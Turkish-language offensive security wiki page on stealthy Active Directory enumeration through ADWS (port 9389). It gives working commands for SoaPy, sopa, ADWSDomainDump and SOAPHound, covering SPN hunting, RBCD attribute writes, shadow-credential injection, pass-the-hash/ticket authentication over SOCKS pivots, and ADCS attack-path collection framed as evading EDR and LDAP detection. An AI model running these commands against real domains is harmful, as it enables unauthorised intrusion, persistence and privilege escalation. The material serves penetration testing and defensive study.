# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## ADWS nedir?

Active Directory Web Services (ADWS), **Windows Server 2008 R2'den bu yana her Domain Controller'da varsayılan olarak etkindir** ve TCP **9389** portunu dinler. Adına rağmen **HTTP kullanılmaz**. Bunun yerine hizmet, LDAP tarzı verileri özel .NET framing protokollerinden oluşan bir yığın üzerinden sunar:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Trafik bu ikili SOAP frame'leri içinde kapsüllendiğinden ve yaygın olmayan bir port üzerinden aktığından, **ADWS üzerinden yapılan enumeration'ın incelenme, filtrelenme veya imza tabanlı tespitten kaçma olasılığı klasik LDAP/389 ve 636 trafiğine göre çok daha yüksektir**. Operatörler için bunun anlamı şudur:<sup>[[1]](#references)[[7]](#references)</sup>

* Daha gizli recon – Blue team'ler çoğunlukla LDAP sorgularına odaklanır.
* SOCKS proxy üzerinden 9389/TCP tünelleyerek **Windows dışı host'lardan (Linux, macOS)** veri toplama özgürlüğü.
* LDAP üzerinden alabileceğiniz verilerin aynısı (users, groups, ACLs, schema vb.) ve **yazma** işlemleri yapabilme olanağı (ör. **RBCD** için `msDs-AllowedToActOnBehalfOfOtherIdentity`).

ADWS etkileşimleri WS-Enumeration üzerinden uygulanır: Her sorgu, LDAP filtresini/özniteliklerini tanımlayan ve bir `EnumerationContext` GUID'i döndüren `Enumerate` mesajıyla başlar; ardından sunucu tarafından tanımlanan sonuç penceresine kadar veri aktaran bir veya daha fazla `Pull` mesajı gelir.<sup>[[7]](#references)</sup> Context'lerin süresi yaklaşık 30 dakika sonra dolar. Bu nedenle araçların durumu kaybetmemek için sonuçları sayfalara ayırması veya filtreleri (CN başına prefix sorguları) bölmesi gerekir.<sup>[[8]](#references)</sup> Security descriptor'ları isterken, SACL'leri hariç tutmak için `LDAP_SERVER_SD_FLAGS_OID` kontrolünü belirtin; aksi takdirde ADWS `nTSecurityDescriptor` özniteliğini SOAP yanıtından tamamen çıkarır.

> NOT: ADWS birçok RSAT GUI/PowerShell aracı tarafından da kullanılır; bu nedenle trafik meşru yönetici etkinlikleriyle karışabilir.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy), **ADWS protokol yığınının tamamen Python ile yeniden uygulanmış hâlidir**. NBFX/NBFSE/NNS/NMF frame'lerini byte-for-byte oluşturur ve .NET runtime'a dokunmadan Unix benzeri sistemlerden veri toplamayı sağlar.<sup>[[1]](#references)[[2]](#references)</sup>

### Temel Özellikler

* **SOCKS üzerinden proxy desteği** (C2 implant'larından kullanım için faydalıdır).
* LDAP `-q '(objectClass=user)'` ile aynı ayrıntı düzeyinde arama filtreleri.
* RBCD, SPN'ler, hesap bayrakları ve key credentials için hedefe yönelik **yazma** işlemleri.<sup>[[2]](#references)</sup>
* SOAPy çıktısı **BOFHound** tarafından ayrıştırılabilir ve BloodHound'a aktarılabilir.<sup>[[2]](#references)[[3]](#references)</sup>
* İnsan tarafından okunabilirlik gerektiğinde zaman damgalarını / `userAccountControl` değerini daha anlaşılır hâle getiren `--parse` flag'i.<sup>[[2]](#references)</sup>

### Hedefe yönelik toplama flag'leri ve yazma işlemleri

SoaPy, en yaygın LDAP hunting görevlerini ADWS üzerinden gerçekleştiren, özenle seçilmiş anahtarlar sunar: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds` ve özel veri çekimleri için ham `--query` / `--filter` seçenekleri. Bunları `--rbcd <source>` (`msDs-AllowedToActOnBehalfOfOtherIdentity` ayarlar), `--spn <service/cn>` (hedefe yönelik Kerberoasting için SPN hazırlama) ve `--asrep` (`userAccountControl` içindeki `DONT_REQ_PREAUTH` değerini değiştirir) gibi yazma işlemleriyle birlikte kullanın.<sup>[[2]](#references)</sup>

Yalnızca `samAccountName` ve `servicePrincipalName` döndüren hedefe yönelik SPN hunting örneği:

```bash
SOAPy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

Aynı host/kimlik bilgilerini kullanarak bulguları hemen istismara hazır hale getirin: `--rbcds` ile RBCD için zaten yapılandırılmış nesneleri dump edin, ardından Resource-Based Constrained Delegation zincirini hazırlamak için `--rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'` uygulayın (tam istismar yolu için [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) bölümüne bakın).<sup>[[2]](#references)</sup>

### Kurulum (operatör host'u)

Upstream deposundan güncel SOAPy CLI'yi kurun; çalıştırılabilir dosyanın adı Unix benzeri sistemlerde büyük/küçük harfe duyarlıdır.<sup>[[2]](#references)[[9]](#references)</sup>

```bash
pipx install git+https://github.com/logangoins/SOAPy
```

### SOCKS pivot üzerinden yalnızca ticket kullanarak veri toplama

Bir foothold, plaintext password olmadan Kerberos ticket sağlıyorsa, [Pass the Ticket](pass-the-ticket.md) bölümünde açıklandığı şekilde `.kirbi` ticket'ını `ccache`'e dönüştürün ve ardından SOAPy'yi bu cache'i kullanacak şekilde ayarlayın. DC'nin LDAP service'ine ait bir ticket, belgelenen SOAPy ADWS iş akışında kullanılabilir; hem ADWS hem de Kerberos trafiğini pivot üzerinden yönlendirin.<sup>[[9]](#references)</sup>

```bash
KRB5CCNAME=ticket.ccache proxychains4 SOAPy -k \
  corp.local/alice@dc01.corp.local -q '(objectClass=computer)'
```

### ADWS üzerinden Shadow credentials

Geçerli principal hedef nesnenin `msDS-KeyCredentialLink` özniteliğine yazabiliyorsa SOAPy, ADWS üzerinden bir key credential ekleyebilir ve karşılık gelen PFX'i dışa aktarabilir. Tüm özniteliği temizlemek yerine, doğru şekilde kaldırmak için döndürülen DeviceID değerini kaydedin. PFX'i, [Shadow Credentials](acl-persistence-abuse/shadow-credentials.md) bölümünde açıklandığı gibi PKINIT için kullanın.<sup>[[10]](#references)</sup>

```bash
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds add --shadow-target targetuser
# After use, remove only the DeviceID returned by the add action:
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds remove --shadow-target targetuser --device-id '<DEVICE_ID>'
```

## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* `ldapdomaindump`'ın LDAP sorgularını TCP/9389 üzerindeki ADWS çağrılarıyla değiştiren fork; LDAP-signature tespitlerini azaltır.
* `--force` kullanılmadığı sürece 9389 numaralı porta ilk erişilebilirlik kontrolünü yapar (port taramaları gürültülü/filtrelenmişse bu kontrol atlanır).
* README'de Microsoft Defender for Endpoint ve CrowdStrike Falcon'a karşı başarılı bypass testleri belirtilmiştir.<sup>[[4]](#references)</sup>

### Kurulum

```bash
pipx install .
```

### Kullanım

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

Tipik çıktı, 9389 erişilebilirlik kontrolünü, ADWS bind işlemini ve dump başlangıç/bitişini kaydeder:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - Golang'de ADWS için pratik bir istemci

Soapy'ye benzer şekilde [sopa](https://github.com/Macmod/sopa), ADWS protokol yığınını (MS-NNS + MC-NMF + SOAP) Golang'de uygular ve aşağıdaki gibi ADWS çağrıları yapmak için komut satırı flag'leri sunar:<sup>[[5]](#references)</sup>

* **Nesne arama ve alma** - `query` / `get`
* **Nesne yaşam döngüsü** - `create [user|computer|group|ou|container|custom]` ve `delete`
* **Öznitelik düzenleme** - `attr [add|replace|delete]`
* **Hesap yönetimi** - `set-password` / `change-password`
* `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` gibi diğerleri

### Protokol eşlemesiyle ilgili önemli noktalar

* LDAP tarzı aramalar, öznitelik projeksiyonu, kapsam denetimi (Base/OneLevel/Subtree) ve sayfalama ile **WS-Enumeration** (`Enumerate` + `Pull`) üzerinden yapılır.
* Tek bir nesneyi getirmek için **WS-Transfer** `Get`; öznitelikleri değiştirmek için `Put`; silmek için `Delete` kullanılır.
* Yerleşik nesne oluşturma için **WS-Transfer ResourceFactory** kullanılır; özel nesneler ise YAML şablonlarıyla yönlendirilen bir **IMDA AddRequest** kullanır.
* Parola işlemleri **MS-ADCAP** eylemleridir (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Kimlik doğrulaması olmadan metadata keşfi (mex)

ADWS, kimlik bilgileri olmadan WS-MetadataExchange'i kullanıma sunar; bu, kimlik doğrulaması yapmadan önce erişimin açık olup olmadığını doğrulamanın hızlı bir yoludur:<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### DNS/DC keşfi ve Kerberos hedefleme notları

`--dc` belirtilmez ve `--domain` sağlanırsa Sopa, SRV kayıtları üzerinden DC'leri çözümleyebilir. Aşağıdaki sırayla sorgular ve en yüksek öncelikli hedefi kullanır:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

Operasyonel olarak, segmentlere ayrılmış ortamlarda hataları önlemek için DC tarafından denetlenen bir çözümleyici kullanmayı tercih edin:

* Tüm SRV/PTR/forward lookup işlemlerinin DC DNS üzerinden yapılması için `--dns <DC-IP>` kullanın.
* UDP engellendiğinde veya SRV yanıtları büyük olduğunda `--dns-tcp` kullanın.
* `--dc` bir IP ise sopa her zaman **reverse PTR** lookup gerçekleştirir: ADWS `wsa:To` adres filtresi, Kerberos kullanılmasa bile bir FQDN gerektirir. Reverse zone yoksa doğrudan bir DC FQDN'i sağlayın.<sup>[[5]](#references)</sup>

Örnek (IP + Kerberos, DC üzerinden zorunlu DNS kullanımı):

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Kimlik doğrulama materyali seçenekleri

Düz metin parolaların yanı sıra sopa, ADWS kimlik doğrulaması için **NT hash'lerini**, **Kerberos AES anahtarlarını**, **ccache**'i ve **PKINIT sertifikalarını** (PFX veya PEM) destekler. `--aes-key`, `-c` (ccache) veya sertifika tabanlı seçenekler kullanıldığında Kerberos varsayılan olarak kullanılır.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### Şablonlar aracılığıyla özel nesne oluşturma

İsteğe bağlı nesne sınıfları için `create custom` komutu, IMDA `AddRequest` ile eşleşen bir YAML şablonu kullanır:<sup>[[5]](#references)</sup>

* `parentDN` ve `rdn`, kapsayıcıyı ve göreli DN'yi tanımlar.
* `attributes[].name`, `cn` veya ad alanı belirtilmiş `addata:cn` değerini destekler.
* `attributes[].type`, `string|int|bool|base64|hex` veya açıkça belirtilmiş `xsd:*` değerini kabul eder.
* **`ad:relativeDistinguishedName` veya `ad:container-hierarchy-parent` değerlerini eklemeyin; bunları sopa ekler.**
* `hex` değerleri `xsd:base64Binary` biçimine dönüştürülür; boş dizeler ayarlamak için `value: ""` kullanın.

## SOAPHound – Yüksek Hacimli ADWS Toplama (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound), tüm LDAP etkileşimlerini ADWS içinde tutan ve BloodHound v4 uyumlu JSON çıktısı veren bir .NET toplayıcısıdır. `objectSid`, `objectGUID`, `distinguishedName` ve `objectClass` değerlerinin eksiksiz bir önbelleğini bir kez oluşturur (`--buildcache`), ardından yüksek hacimli `--bhdump`, `--certdump` (ADCS) veya `--dnsdump` (AD ile tümleşik DNS) işlemlerinde bu önbelleği yeniden kullanır; böylece DC'den yalnızca ~35 kritik öznitelik çıkar. AutoSplit (`--autosplit --threshold <N>`), büyük forest'larda 30 dakikalık EnumerationContext zaman aşımına takılmamak için sorguları CN önekine göre otomatik olarak parçalara ayırır.<sup>[[8]](#references)</sup>

Etki alanına katılmış bir operatör VM'sinde tipik iş akışı:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump --autosplit --threshold 1200 --nolaps -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

Export edilen JSON, doğrudan SharpHound/BloodHound iş akışlarında kullanılabilir—sonraki grafikleme fikirleri için [BloodHound methodology](bloodhound.md) sayfasına bakın. AutoSplit, sorgu sayısını ADExplorer tarzı snapshot’lara kıyasla düşük tutarken SOAPHound’un milyonlarca nesne içeren forest’larda dayanıklı çalışmasını sağlar.

## Stealth AD Toplama İş Akışı

Aşağıdaki iş akışı, Linux üzerinden ADWS kullanarak **domain ve ADCS nesnelerini** enumerate etmeyi, bunları BloodHound JSON’a dönüştürmeyi ve sertifika tabanlı saldırı yollarını araştırmayı gösterir:

1. **9389/TCP’yi** hedef ağdan makinenize tünelleyin (ör. Chisel, Meterpreter, SSH dinamik port yönlendirme vb. aracılığıyla). Ham TCP istemcisini SOCKS üzerinden `proxychains4 SOAPy ...` ile yönlendirin (`proxychains4.conf` içinde SOCKS5 adresini yapılandırın); `HTTPS_PROXY`, HTTP olmayan bu protokolü proxy’lemez.<sup>[[9]](#references)</sup>

2. **Kök domain nesnesini toplayın:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Configuration NC'den ADCS ile ilgili nesneleri toplayın:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority)(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **BloodHound'a Dönüştür:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **BloodHound GUI'ye ZIP dosyasını yükleyin** ve sertifika yükseltme yollarını (ESC1, ESC8 vb.) ortaya çıkarmak için `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` gibi cypher sorguları çalıştırın.

### `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD) Yazma

Hedef bilgisayar nesnesine yazma erişiminiz varsa, ham bir security-descriptor dizgesi yerine SOAPy's RBCD eylemini kullanın. Burada `WEBSRV01$` kontrol edilen kaynak, `FILE01$` ise özniteliği değiştirilecek hedeftir.<sup>[[2]](#references)</sup>

```bash
SOAPy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'
```

Kerberos S4U zincirine [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) bölümünde devam edin.

## Araç Özeti

| Amaç | Araç | Notlar |
|---------|------|-------|
| ADWS numaralandırması | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, okuma/yazma |
| Yüksek hacimli ADWS dökümü | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, öncelikli önbellek, BH/ADCS/DNS modları |
| BloodHound verisi aktarımı | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch günlüklerini dönüştürür |
| Sertifika ele geçirme | [Certipy](https://github.com/ly4k/Certipy) | Aynı SOCKS üzerinden proxy edilebilir |
| ADWS numaralandırması ve nesne değişiklikleri | [sopa](https://github.com/Macmod/sopa) | Bilinen ADWS uç noktalarıyla iletişim kurmaya yönelik genel amaçlı istemci; numaralandırma, nesne oluşturma, öznitelik değişiklikleri ve parola değişiklikleri sağlar |



## References

- [1] [SpecterOps – ADWS Kullanarak Gizli AD Toplama İçin Operatör Rehberi: SOAP(y) Kullandığınızdan Emin Olun](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF belirtimleri](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – ADWS Üzerinden Active Directory Ortamlarının Gizlice Numaralandırılması](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – ADWS Üzerinden Active Directory Verisi Toplamak İçin SOAPHound Aracı](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
- [9] [SOAPy Wiki – Keşif](https://github.com/logangoins/SOAPy/wiki/Recon)
- [10] [SOAPy Wiki – Sızma Sonrası](https://github.com/logangoins/SOAPy/wiki/Post%E2%80%90Exploitation)
{{#include ../../banners/hacktricks-training.md}}
